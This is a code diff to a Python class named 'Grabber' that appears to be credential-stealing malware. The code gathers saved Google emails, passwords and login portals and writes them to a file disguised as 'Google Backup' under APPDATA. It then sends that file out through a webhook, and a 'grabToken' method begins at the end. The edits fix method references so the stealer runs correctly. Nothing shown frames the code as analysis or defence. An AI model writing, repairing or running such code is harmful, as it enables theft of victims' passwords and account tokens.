@@ -126,7 +126,7 @@ class Grabber:
                 email = result[1]
                 login = result[0]
                 if password != '':
-                    passwords.append(password)
+                    self.passwords.append(password)
                 with open(f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt', 'a+') as f:
                     data = '=================================='
                     data += '\nEmail : ' + email
@@ -134,7 +134,7 @@ class Grabber:
                     data += '\nLogin portal : ' + login
                     data += '\n=================================\n\n'
                     f.write(data)
-            webHookFile(message="Google login data", file=f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt')  
+            self.webHookFile(message="Google login data", file=f'{os.getenv("APPDATA")}\\Google Backup\\Google.txt')  
 
     def grabToken(self):
         for location in self.dirs:
